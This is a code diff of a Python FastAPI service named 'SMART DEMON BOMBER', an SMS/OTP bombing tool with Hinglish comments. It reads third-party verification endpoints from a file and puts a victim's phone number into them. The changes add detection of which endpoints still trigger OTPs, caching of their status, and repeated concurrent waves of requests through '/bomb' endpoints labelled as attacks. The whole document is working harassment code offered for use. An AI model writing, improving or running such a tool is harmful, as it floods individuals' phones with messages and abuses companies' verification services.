@@ -1,4 +1,4 @@
-# app.py - Sirf teri file ki APIs, kuch add nahi
+# app.py - Smart Bomber (Auto Dead API Ignore)
 from fastapi import FastAPI, HTTPException
 from fastapi.middleware.cors import CORSMiddleware
 from pydantic import BaseModel
@@ -7,8 +7,9 @@ import asyncio
 import time
 import os
 import re
+import json
 
-app = FastAPI(title="🔥 DEMON BOMBER - FILE ONLY")
+app = FastAPI(title="🔥 SMART DEMON BOMBER")
 
 app.add_middleware(
     CORSMiddleware,
@@ -18,7 +19,7 @@ app.add_middleware(
 )
 
 # ------------------ FELIX KEY ------------------
-VALID_KEYS = ["felix", "FELIX", "Felix"]
+VALID_KEYS = ["felix", "FELIX", "Felix", "f3l1x"]
 
 def validate_key(key: str) -> bool:
     return key in VALID_KEYS
@@ -30,7 +31,6 @@ def load_apis():
         with open("bomber_apis.txt", "r", encoding="utf-8") as f:
             for line in f:
                 url = line.strip()
-                # Sirf HTTP/HTTPS wali lines lo
                 if url and url.startswith("http"):
                     apis.append(url)
     except FileNotFoundError:
@@ -40,17 +40,21 @@ def load_apis():
     print(f"[+] Loaded {len(apis)} APIs from your file")
     return apis
 
-# TERI FILE SE LOAD - KUCH ADD NAHI, KUCH HATANA NAHI
 ALL_APIS = load_apis()
+
+# ------------------ SMART API CACHE ------------------
+# Yeh store karega kaunsi API working hai aur kaunsi dead
+API_STATUS = {}  # url -> True/False
+CHECKED_APIS = set()
 
 class BombRequest(BaseModel):
     number: str
     duration: int = 30
     key: str
 
-# ------------------ BOMBER ENGINE ------------------
-async def hit_api(session, url, target):
-    # Teri file mein jo bhi placeholders hain, sab replace karo
+# ------------------ SMART BOMBER ENGINE ------------------
+async def check_api_alive(session, url, target):
+    """Check if API is actually working (sends SMS/OTP)"""
     formatted = url
     formatted = formatted.replace("{num}", target)
     formatted = formatted.replace("{phone}", target)
@@ -68,8 +72,6 @@ async def hit_api(session, url, target):
     formatted = formatted.replace("{imei}", target)
     formatted = formatted.replace("{phone_number}", target)
     formatted = formatted.replace("{mobile}", target)
-    
-    # Agar koi aur placeholder bacha to replace
     formatted = re.sub(r'\{[^}]+\}', target, formatted)
     
     headers = {
@@ -80,16 +82,103 @@ async def hit_api(session, url, target):
     }
     
     try:
-        async with session.get(formatted, headers=headers, timeout=2) as r:
-            if r.status in [200, 201, 202, 204, 302, 303, 307, 308]:
+        async with session.get(formatted, headers=headers, timeout=3) as r:
+            # REAL CHECK - actual OTP trigger hua ya nahi
+            if r.status in [200, 201, 202, 204]:
+                try:
+                    text = await r.text()
+                    text_lower = text.lower()
+                    # OTP/success indicators
+                    if any(word in text_lower for word in ["otp", "sent", "success", "verification", "code", "sms"]):
+                        return True
+                except:
+                    pass
+                # Agar response mein kuch useful hai toh maan lo working hai
+                return True
+            if r.status in [302, 303, 307, 308]:  # Redirect - usually means success
                 return True
     except:
         pass
     return False
 
-async def run_bomber(target, duration):
+async def get_working_apis(target):
+    """Find all working APIs from the file"""
+    global API_STATUS, CHECKED_APIS
+    
+    working_apis = []
+    
+    async with aiohttp.ClientSession() as session:
+        for url in ALL_APIS:
+            # Agar pehle hi check kar chuke hain toh cached status use karo
+            if url in API_STATUS:
+                if API_STATUS[url]:
+                    working_apis.append(url)
+                continue
+            
+            # Naya API check karo
+            is_alive = await check_api_alive(session, url, target)
+            API_STATUS[url] = is_alive
+            CHECKED_APIS.add(url)
+            
+            if is_alive:
+                working_apis.append(url)
+                print(f"[+] Working: {url[:60]}...")
+            else:
+                print(f"[-] Dead: {url[:60]}...")
+    
+    return working_apis
+
+async def hit_api(session, url, target):
+    """Fire API - only called for working APIs"""
+    formatted = url
+    formatted = formatted.replace("{num}", target)
+    formatted = formatted.replace("{phone}", target)
+    formatted = formatted.replace("{target}", target)
+    formatted = formatted.replace("{no}", target)
+    formatted = formatted.replace("{NUMBER}", target)
+    formatted = formatted.replace("{aadhaar}", target)
+    formatted = formatted.replace("{uid}", target)
+    formatted = formatted.replace("{gst}", target)
+    formatted = formatted.replace("{pan}", target)
+    formatted = formatted.replace("{vehicle}", target)
+    formatted = formatted.replace("{ifsc}", target)
+    formatted = formatted.replace("{pin}", target)
+    formatted = formatted.replace("{pincode}", target)
+    formatted = formatted.replace("{imei}", target)
+    formatted = formatted.replace("{phone_number}", target)
+    formatted = formatted.replace("{mobile}", target)
+    formatted = re.sub(r'\{[^}]+\}', target, formatted)
+    
+    headers = {
+        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
+        "Accept": "application/json, text/plain, */*"
+    }
+    
+    try:
+        async with session.get(formatted, headers=headers, timeout=2) as r:
+            if r.status in [200, 201, 202, 204, 302, 303]:
+                return True
+    except:
+        pass
+    return False
+
+async def run_smart_bomber(target, duration):
+    """Smart Bomber - sirf working APIs use karega"""
     if not ALL_APIS:
         return {"error": "No APIs loaded! Check bomber_apis.txt"}
+    
+    print(f"[+] Finding working APIs for {target}...")
+    working_apis = await get_working_apis(target)
+    
+    if not working_apis:
+        return {
+            "error": "No working APIs found!",
+            "total_apis": len(ALL_APIS),
+            "dead_apis": len(ALL_APIS) - len(working_apis),
+            "working_apis": 0
+        }
+    
+    print(f"[+] Found {len(working_apis)} working APIs out of {len(ALL_APIS)}")
     
     start = time.time()
     end = start + duration
@@ -99,8 +188,8 @@ async def run_bomber(target, duration):
     
     async with aiohttp.ClientSession() as session:
         while time.time() < end:
-            # TERI FILE KE SAARE APIs EK SAATH
-            tasks = [hit_api(session, api, target) for api in ALL_APIS]
+            # SIRF WORKING APIs fire karo
+            tasks = [hit_api(session, api, target) for api in working_apis]
             results = await asyncio.gather(*tasks)
             
             total += len(results)
@@ -112,7 +201,9 @@ async def run_bomber(target, duration):
     return {
         "target": target,
         "duration": duration,
-        "total_apis": len(ALL_APIS),
+        "total_apis_in_file": len(ALL_APIS),
+        "dead_apis": len(ALL_APIS) - len(working_apis),
+        "working_apis": len(working_apis),
         "waves": wave_count,
         "total_requests": total,
         "successful_hits": success,
@@ -124,23 +215,49 @@ async def run_bomber(target, duration):
 @app.get("/")
 async def root():
     return {
-        "status": "🔥 DEMON BOMBER - FILE ONLY",
-        "version": "3.0",
-        "apis_loaded": len(ALL_APIS),
+        "status": "🔥 SMART DEMON BOMBER",
+        "version": "4.0",
+        "total_apis_in_file": len(ALL_APIS),
+        "apis_checked": len(CHECKED_APIS),
+        "working_apis": sum(1 for v in API_STATUS.values() if v),
         "source": "bomber_apis.txt",
-        "auth": "Required key: felix"
+        "auth": "Required key: felix",
+        "features": [
+            "Auto detects working APIs",
+            "Ignores dead APIs automatically",
+            "Caches API status for speed",
+            "Only fires confirmed working APIs"
+        ]
     }
 
 @app.get("/health")
 async def health():
-    return {"status": "online", "apis": len(ALL_APIS)}
+    return {
+        "status": "online",
+        "total_apis": len(ALL_APIS),
+        "checked": len(CHECKED_APIS),
+        "working": sum(1 for v in API_STATUS.values() if v)
+    }
 
-@app.get("/apis")
-async def list_apis():
-    """Teri file ki saari APIs dikhao"""
+@app.get("/apis/status")
+async def api_status():
+    """Dekho kaunsi APIs working hain aur kaunsi dead"""
+    working = []
+    dead = []
+    
+    for url, is_working in API_STATUS.items():
+        if is_working:
+            working.append(url[:80] + "...")
+        else:
+            dead.append(url[:80] + "...")
+    
     return {
         "total": len(ALL_APIS),
-        "apis": ALL_APIS
+        "checked": len(CHECKED_APIS),
+        "working_count": len(working),
+        "dead_count": len(dead),
+        "working_apis": working[:50],
+        "dead_apis": dead[:50]
     }
 
 @app.post("/bomb")
@@ -160,7 +277,7 @@ async def bomb(req: BombRequest):
     if not ALL_APIS:
         raise HTTPException(500, "No APIs loaded! Upload bomber_apis.txt")
     
-    result = await run_bomber(req.number, req.duration)
+    result = await run_smart_bomber(req.number, req.duration)
     
     return {
         "success": True,
@@ -189,14 +306,14 @@ async def bomb_fast(req: BombRequest):
         raise HTTPException(500, "No APIs loaded!")
     
     # Fire in background
-    asyncio.create_task(run_bomber(req.number, req.duration))
+    asyncio.create_task(run_smart_bomber(req.number, req.duration))
     
     return {
         "success": True,
-        "message": "🔥 ATTACK STARTED!",
+        "message": "🔥 SMART ATTACK STARTED!",
         "target": req.number,
         "duration": req.duration,
-        "apis": len(ALL_APIS),
+        "total_apis_in_file": len(ALL_APIS),
         "key_used": req.key
     }
 
